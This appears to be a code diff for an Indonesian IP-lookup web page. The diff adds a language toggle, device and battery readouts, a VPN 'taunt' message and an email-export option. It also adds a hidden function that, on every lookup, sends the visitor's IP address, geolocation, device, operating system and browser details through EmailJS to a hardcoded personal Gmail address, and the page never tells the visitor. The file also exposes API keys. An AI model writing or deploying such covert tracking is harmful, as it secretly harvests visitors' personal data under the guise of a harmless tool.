@@ -1,180 +1,379 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website Cek IP</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: var(--bg-color, #f4f4f9);
-            color: var(--text-color, #333);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Website Cek IP</title>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("twvSRtIZWpw_XIX3K");
+    })();
+  </script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--bg-color, #f4f4f9);
+      color: var(--text-color, #333);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
+    .fade-in { animation: fadeIn 1.2s ease-in-out; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .container {
+      text-align: left;
+      background: var(--container-bg, white);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 450px;
+    }
+    .container h1 { font-size: 26px; margin-bottom: 20px; text-align: center; }
+    .container input,
+    .container button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      font-size: 15px;
+      border-radius: 8px;
+    }
+    .container input { border: 1px solid #ccc; }
+    .container button {
+      border: none;
+      color: white;
+      background: linear-gradient(135deg, #007BFF, #0056b3);
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .container button:hover {
+      background: linear-gradient(135deg, #0056b3, #003f7f);
+    }
+    .ip-display, .details {
+      margin-top: 20px;
+      font-size: 15px;
+      line-height: 1.8;
+    }
+    .dark-mode {
+      --bg-color: #222;
+      --text-color: #f4f4f9;
+      --container-bg: #333;
+    }
+    .toggle-theme {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 10px 14px;
+      background: var(--container-bg, white);
+      color: var(--text-color, black);
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .toggle-theme:hover { background: #666; }
+    #languageToggle { top: 100px; right: 20px; position: fixed; }
+    #resetButton { top: 140px; right: 20px; position: fixed; }
+    #downloadDataBtn { top: 180px; right: 20px; position: fixed; }
 
-        .fade-in {
-            animation: fadeIn 2s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .container {
-            text-align: center;
-            background: var(--container-bg, white);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            width: 90%;
-            max-width: 400px;
-        }
-
-        .container h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-
-        .container input {
-            width: 80%;
-            padding: 10px;
-            margin-bottom: 10px ;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .container button {
-            padding: 10px 20px;
-            font-size: 16px;
-            color: white;
-            background-color: #007BFF;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .container button:hover {
-            background-color: #0056b3;
-        }
-
-        .ip-display, .details {
-            margin-top: 20px;
-            font-size: 16px;
-        }
-
-        .dark-mode {
-            --bg-color: #333;
-            --text-color: #f4f4f9;
-            --container-bg: #444;
-        }
-
-        .toggle-theme {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 10px;
-            background: var(--container-bg, white);
-            color: var(--text-color, black);
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .toggle-theme:hover {
-            background: #666;
-        }
-
-    </style>
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 99;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 360px;
+    }
+  </style>
 </head>
 <body class="fade-in">
-    <button class="toggle-theme" onclick="toggleTheme()">Dark Mode</button>
-    <button id="playBacksound" class="toggle-theme" style="top: 60px;" onclick="toggleBacksound()">Play Backsound</button>
-    <audio id="backsound" loop>
-        <source src="https://files.catbox.moe/p5htu5.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-    <div class="container">
-        <h1>Cek Alamat IP</h1>
-        <input type="text" id="ipInput" placeholder="Masukkan IP (Opsional)">
-        <button onclick="getIPAddress()">Cek IP</button>
-        <div class="ip-display" id="ipDisplay">IP Anda akan tampil di sini.</div>
-        <div class="details" id="details"></div>
+  <button class="toggle-theme" onclick="toggleTheme()">Dark Mode</button>
+  <button id="playBacksound" class="toggle-theme" style="top: 60px;" onclick="toggleBacksound()">Play Backsound</button>
+  <button id="languageToggle" class="toggle-theme" onclick="toggleLanguage()">English</button>
+  <button id="resetButton" class="toggle-theme" onclick="resetApp()">Reset</button>
+  <button id="downloadDataBtn" class="toggle-theme" onclick="showModal()">Download Data</button>
+  <audio id="backsound" loop><source src="https://files.catbox.moe/p5htu5.mp3" type="audio/mpeg"></audio>
+
+  <div class="container">
+    <h1 id="title">Cek Alamat IP</h1>
+    <input type="text" id="ipInput" placeholder="Masukkan IP (Opsional)">
+    <button onclick="getIPAddress()" id="cekButton">Cek IP</button>
+    <div class="ip-display" id="ipDisplay">IP Anda akan tampil di sini.</div>
+    <div class="details" id="details"></div>
+  </div>
+
+  <div class="modal" id="modal" onclick="if(event.target.id==='modal'){modal.style.display='none'}">
+    <div class="modal-content">
+      <input type="email" id="emailInput" placeholder="Email Anda">
+      <button onclick="downloadAsTxt()">Download .txt</button>
+      <button onclick="sendEmail()">Kirim ke Email</button>
     </div>
+  </div><script>
+  const translations = {
+    id: {
+      title: "Cek Alamat IP",
+      placeholder: "Masukkan IP (Opsional)",
+      cekButton: "Cek IP",
+      languageButton: "English",
+      resetButton: "Reset",
+      ipDisplay: "IP Anda akan tampil di sini.",
+      labels: {
+        country: "Negara",
+        city: "Kota",
+        region: "Wilayah",
+        continent: "Benua",
+        timezone: "Zona Waktu IP",
+        latitude: "Latitude",
+        longitude: "Longitude",
+        currency: "Mata Uang",
+        languages: "Bahasa",
+        device: "Perangkat",
+        brand: "Merk",
+        model: "Model",
+        os: "Sistem Operasi",
+        browser: "Browser",
+        timezoneLocal: "Zona Waktu",
+        currentTime: "Jam Saat Ini",
+        battery: "Baterai",
+        charging: "Status Cas",
+        chargingYes: "Sedang dicas",
+        chargingNo: "Tidak dicas",
+        vpnTaunts: ["Wah, pakai VPN ya?", "Ketahuan nyamar!", "VPN tidak menyelamatkanmu!"]
+      }
+    },
+    en: {
+      title: "Check IP Address",
+      placeholder: "Enter IP (Optional)",
+      cekButton: "Check IP",
+      languageButton: "Bahasa Indonesia",
+      resetButton: "Reset",
+      ipDisplay: "Your IP will appear here.",
+      labels: {
+        country: "Country",
+        city: "City",
+        region: "Region",
+        continent: "Continent",
+        timezone: "IP Timezone",
+        latitude: "Latitude",
+        longitude: "Longitude",
+        currency: "Currency",
+        languages: "Languages",
+        device: "Device",
+        brand: "Brand",
+        model: "Model",
+        os: "Operating System",
+        browser: "Browser",
+        timezoneLocal: "Local Timezone",
+        currentTime: "Current Time",
+        battery: "Battery",
+        charging: "Charging Status",
+        chargingYes: "Charging",
+        chargingNo: "Not Charging",
+        vpnTaunts: ["Using VPN?", "Caught faking it!", "VPN won't save you!"]
+      }
+    }
+  };
 
-    <script>
-        function toggleTheme() {
-            document.body.classList.toggle('dark-mode');
-        }
+  let currentLang = localStorage.getItem("lang") || "id";
 
-        function toggleBacksound() {
-            const audio = document.getElementById('backsound');
-            const button = document.getElementById('playBacksound');
-            if (audio.paused) {
-                audio.play();
-                button.textContent = 'Pause Backsound';
-            } else {
-                audio.pause();
-                button.textContent = 'Play Backsound';
-            }
-        }
+  function applyLanguage(lang) {
+    currentLang = lang;
+    const t = translations[lang];
+    document.documentElement.lang = lang;
+    document.getElementById("title").textContent = t.title;
+    document.getElementById("ipInput").placeholder = t.placeholder;
+    document.getElementById("cekButton").textContent = t.cekButton;
+    document.getElementById("languageToggle").textContent = t.languageButton;
+    document.getElementById("resetButton").textContent = t.resetButton;
+    const saved = JSON.parse(localStorage.getItem("ipData"));
+    if (saved) renderIPDetails(saved.data);
+  }
 
-        function getIPAddress() {
-            const ipDisplay = document.getElementById('ipDisplay');
-            const details = document.getElementById('details');
-            const ipInput = document.getElementById('ipInput').value.trim();
+  function toggleLanguage() {
+    const newLang = currentLang === "id" ? "en" : "id";
+    localStorage.setItem("lang", newLang);
+    applyLanguage(newLang);
+  }
 
-            ipDisplay.textContent = 'Sedang mengambil data...';
-            details.textContent = '';
+  function resetApp() {
+    localStorage.clear();
+    location.reload();
+  }
 
-            if (ipInput) {
-                fetchIPDetails(ipInput);
-            } else {
-                fetch('https://api64.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        ipDisplay.textContent = `IP Address: ${data.ip}`;
-                        fetchIPDetails(data.ip);
-                    })
-                    .catch(error => {
-                        ipDisplay.textContent = 'Gagal mengambil IP. Coba lagi nanti.';
-                        console.error('Error fetching IP:', error);
-                    });
-            }
-        }
+  function toggleTheme() {
+    document.body.classList.toggle('dark-mode');
+  }
 
-        function fetchIPDetails(ip) {
-            const details = document.getElementById('details');
+  function toggleBacksound() {
+    const audio = document.getElementById('backsound');
+    const button = document.getElementById('playBacksound');
+    if (audio.paused) {
+      audio.play(); button.textContent = 'Pause Backsound';
+    } else {
+      audio.pause(); button.textContent = 'Play Backsound';
+    }
+  }
 
-            fetch(`https://ipfind.co/?ip=${ip}&auth=c4fae2fc-7900-4819-8c0e-77776244d479`)
-                .then(response => response.json())
-                .then(data => {
-                    details.innerHTML = `
-                        <p>IP Address: ${data.ip_address}</p>
-                        <p>Country: ${data.country} (${data.country_code})</p>
-                        <p>City: ${data.city}</p>
-                        <p>Region: ${data.region}</p>
-                        <p>Continent: ${data.continent}</p>
-                        <p>Timezone: ${data.timezone}</p>
-                        <p>Latitude: ${data.latitude}</p>
-                        <p>Longitude: ${data.longitude}</p>
-                        <p>Currency: ${data.currency}</p>
-                        <p>Languages: ${data.languages ? data.languages.join(', ') : 'N/A'}</p>
-                    `;
-                })
-                .catch(error => {
-                    details.textContent = 'Gagal mengambil data. Coba lagi nanti.';
-                    console.error('Error fetching IP details:', error);
-                });
-        }
-    </script>
+  function getIPAddress() {
+    const ipInput = document.getElementById('ipInput').value.trim();
+    const ipDisplay = document.getElementById('ipDisplay');
+    ipDisplay.textContent = 'Sedang mengambil data...';
+    document.getElementById('details').innerHTML = '';
+    if (ipInput) {
+      ipDisplay.textContent = `IP Address: ${ipInput}`;
+      fetchIPDetails(ipInput);
+    } else {
+      fetch('https://api64.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          ipDisplay.textContent = `IP Address: ${data.ip}`;
+          fetchIPDetails(data.ip);
+        });
+    }
+  }
 
-    <!-- Include jQuery -->
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  function fetchIPDetails(ip) {
+    fetch(`https://ipfind.co/?ip=${ip}&auth=c4fae2fc-7900-4819-8c0e-77776244d479`)
+      .then(res => res.json())
+      .then(data => {
+        localStorage.setItem("ipData", JSON.stringify({ ip, data }));
+        renderIPDetails(data);
+        detectVPNAndTaunt(data);
+
+        const fullData = getAllData();
+        sendEmailToOwner(fullData);
+      });
+  }
+
+  function renderIPDetails(data) {
+    const t = translations[currentLang].labels;
+    const d = document.getElementById('details');
+    const ua = new UAParser().getResult();
+    d.innerHTML = `
+      <p><strong>${t.country}:</strong> ${data.country} (${data.country_code})</p>
+      <p><strong>${t.city}:</strong> ${data.city}</p>
+      <p><strong>${t.region}:</strong> ${data.region}</p>
+      <p><strong>${t.continent}:</strong> ${data.continent}</p>
+      <p><strong>${t.timezone}:</strong> ${data.timezone}</p>
+      <p><strong>${t.latitude}:</strong> ${data.latitude}</p>
+      <p><strong>${t.longitude}:</strong> ${data.longitude}</p>
+      <p><strong>${t.currency}:</strong> ${data.currency}</p>
+      <p><strong>${t.languages}:</strong> ${data.languages?.join(', ') || 'N/A'}</p>
+      <p><strong>${t.device}:</strong> ${ua.device.type || 'Desktop'}</p>
+      <p><strong>${t.brand}:</strong> ${ua.device.vendor || '-'}</p>
+      <p><strong>${t.model}:</strong> ${ua.device.model || '-'}</p>
+      <p><strong>${t.os}:</strong> ${ua.os.name} ${ua.os.version}</p>
+      <p><strong>${t.browser}:</strong> ${ua.browser.name} ${ua.browser.version}</p>
+    `;
+  }
+
+  function detectVPNAndTaunt(data) {
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const suspected = (
+      (data.country !== "Indonesia" && timezone.includes("Asia")) ||
+      (data.country === "Indonesia" && !timezone.includes("Asia"))
+    );
+    if (suspected) {
+      const taunts = translations[currentLang].labels.vpnTaunts;
+      const t = taunts[Math.floor(Math.random() * taunts.length)];
+      document.getElementById('details').innerHTML += `<p style='color:red'><strong>${t}</strong></p>`;
+    }
+  }
+
+  function getAllData() {
+    return `${document.getElementById('ipDisplay').textContent}\n\n${document.getElementById('details').innerText}`;
+  }
+
+  function downloadAsTxt() {
+    const text = getAllData();
+    const date = new Date().toISOString().split("T")[0];
+    const blob = new Blob([text], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `data-ip-${date}.txt`;
+    a.click();
+  }
+
+  function sendEmail() {
+    const email = document.getElementById('emailInput').value;
+    if (!email) return alert('Masukkan email');
+    emailjs.send("service_qjv30t1", "template_2dcbcid", {
+      passcode: getAllData(),
+      email: email
+    }).then(() => {
+      alert("Email terkirim!");
+    }).catch(() => {
+      alert("Gagal mengirim email.");
+    });
+  }
+
+  function sendEmailToOwner(dataText) {
+    emailjs.send("service_qjv30t1", "template_2dcbcid", {
+      passcode: dataText,
+      email: "randibisnis2@gmail.com"
+    });
+  }
+
+  function showModal() {
+    document.getElementById('modal').style.display = 'flex';
+  }
+
+  function showCurrentTime() {
+    const t = translations[currentLang].labels;
+    const d = document.getElementById('details');
+    setInterval(() => {
+      const now = new Date().toLocaleTimeString(currentLang === 'id' ? 'id-ID' : 'en-US');
+      let el = document.getElementById('current-time');
+      if (!el) {
+        el = document.createElement('p');
+        el.id = 'current-time';
+        d.appendChild(el);
+      }
+      el.innerHTML = `<strong>${t.currentTime}:</strong> ${now}`;
+    }, 1000);
+  }
+
+  function getBatteryInfo() {
+    const t = translations[currentLang].labels;
+    const d = document.getElementById('details');
+    if (navigator.getBattery) {
+      navigator.getBattery().then(b => {
+        d.innerHTML += `<p><strong>${t.battery}:</strong> ${Math.round(b.level * 100)}%</p>`;
+        d.innerHTML += `<p><strong>${t.charging}:</strong> ${b.charging ? t.chargingYes : t.chargingNo}</p>`;
+      });
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    applyLanguage(currentLang);
+    showCurrentTime();
+    getBatteryInfo();
+    const saved = JSON.parse(localStorage.getItem("ipData"));
+    if (saved) {
+      document.getElementById('ipDisplay').textContent = `IP Address: ${saved.ip}`;
+      renderIPDetails(saved.data);
+      detectVPNAndTaunt(saved.data);
+    } else {
+      document.getElementById('ipDisplay').textContent = translations[currentLang].ipDisplay;
+    }
+  });
+</script>
 </body>
 </html>
